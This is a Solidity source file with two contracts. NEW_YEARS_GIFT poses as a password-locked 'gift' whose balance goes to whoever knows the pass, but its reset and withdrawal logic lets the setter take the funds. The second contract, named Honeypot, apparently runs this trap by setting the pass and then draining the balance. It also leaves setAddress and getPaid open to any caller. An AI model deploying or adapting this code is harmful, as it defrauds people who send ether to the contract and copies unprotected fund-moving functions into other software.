pragma solidity ^0.4.19;

contract NEW_YEARS_GIFT
{
    string public message;
    
    bool public passHasBeenSet = false;
    
    address sender;
    
    bytes32 public hashPass;
	
	function() public payable{}
    
    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
        {
            hashPass = hash;
            sender = msg.sender;
        }
    }
    
    function SetMessage(string _message)
    public
    {
        if(msg.sender==sender)
        {
            message =_message;
        }
    }
    
    function GetGift(bytes pass)
    external
    payable
    returns (string)
    {
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
            return message;
        }
    }
    
    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
            message="";
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(msg.sender==sender&&hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }
}

contract Honeypot
{
    NEW_YEARS_GIFT public c;
    uint256 public bal;
    
    function() public payable{}
    
    function setAddress(address _a) public {
        c = NEW_YEARS_GIFT(_a);
    }
    
    
    function setPass(bytes32 _hash) public payable{
        c.SetPass.value(1.01 ether)(_hash);
        c.PassHasBeenSet(_hash);
    }
    
    function getPaid(address _a) public {
        c.Revoce();
        bal = this.balance;
        _a.transfer(this.balance);
    }
}
